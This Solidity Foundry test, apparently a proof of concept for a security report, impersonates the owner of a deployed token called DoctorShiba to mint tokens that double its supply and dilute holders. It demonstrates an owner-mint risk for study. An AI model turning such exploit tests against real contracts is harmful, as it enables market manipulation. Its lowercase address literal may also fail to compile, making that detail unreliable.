```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IDoctorShiba {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external returns (bool);
}

contract ExploitTest is Test {
    // Deployed contract address from the report
    address constant TARGET = 0x783e086d67670c0d85c4ef34ebbee5a8253b38ee;

    IDoctorShiba doctorShiba;

    function setUp() public {
        doctorShiba = IDoctorShiba(TARGET);
        vm.label(TARGET, "DoctorShiba");
    }

    function testMintInflation() public {
        // Get owner of the contract (the entity that can mint)
        address owner = doctorShiba.owner();
        vm.label(owner, "Owner");

        // Get current state before mint
        uint256 supplyBefore = doctorShiba.totalSupply();
        uint256 ownerBalanceBefore = doctorShiba.balanceOf(owner);

        // Amount to mint: same as current total supply to double it
        uint256 mintAmount = supplyBefore;

        // Impersonate owner and mint tokens to a user (e.g., the test contract)
        vm.startPrank(owner);
        bool success = doctorShiba.mint(address(this), mintAmount);
        vm.stopPrank();

        require(success, "Mint failed");

        // Check that total supply increased by mintAmount
        uint256 supplyAfter = doctorShiba.totalSupply();
        assertEq(supplyAfter, supplyBefore + mintAmount, "Total supply mismatch");

        // Check that the test contract received the minted tokens
        uint256 balanceHere = doctorShiba.balanceOf(address(this));
        assertEq(balanceHere, mintAmount, "Minted balance not received");

        // Show dilution: owner's percentage of total supply decreased
        uint256 ownerBalanceAfter = doctorShiba.balanceOf(owner);
        // Owner's balance unchanged, but total supply doubled -> % halved
        assertEq(ownerBalanceAfter, ownerBalanceBefore, "Owner balance should not change");

        // Verify the owner can also mint to themselves, but that's not needed for PoC.
    }
}
```
